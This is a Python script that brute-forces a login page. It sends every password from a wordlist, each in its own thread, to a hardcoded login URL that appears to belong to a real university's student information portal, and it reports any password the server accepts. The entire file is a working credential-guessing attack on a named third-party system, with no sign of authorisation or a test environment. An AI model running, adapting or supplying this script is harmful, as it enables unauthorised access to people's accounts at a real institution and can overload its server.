import threading
import requests
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('--username','-u', type=str, required=True)
parser.add_argument('--wordlist','-w', type=str, required=True)

args = parser.parse_args()


username = args.username
wordlists_path = args.wordlist
url = 'https://erp.gctu.edu.gh/sip/auth/login.php'

def check_password(username, password):
    url = 'https://erp.gctu.edu.gh/sip/auth/login.php'
    data = {'username':username, 'password':password}
    r = requests.post(url, data=data)
    if r.text == 'ok':
        print("Password found:%s" %(password))
    else:
        print("[*]checking %s with username:%s and password:%s" %(url, username, password))

#reading wordlist file
with open(wordlists_path) as wordlists:
    try:
        for passwd in wordlists.readlines():
            passwd = passwd.strip('\n')
            thread = threading.Thread(target=check_password, args=(username, passwd))
            thread.start()
    except KeyboardInterrupt:
        print("[+]Quitting... ")
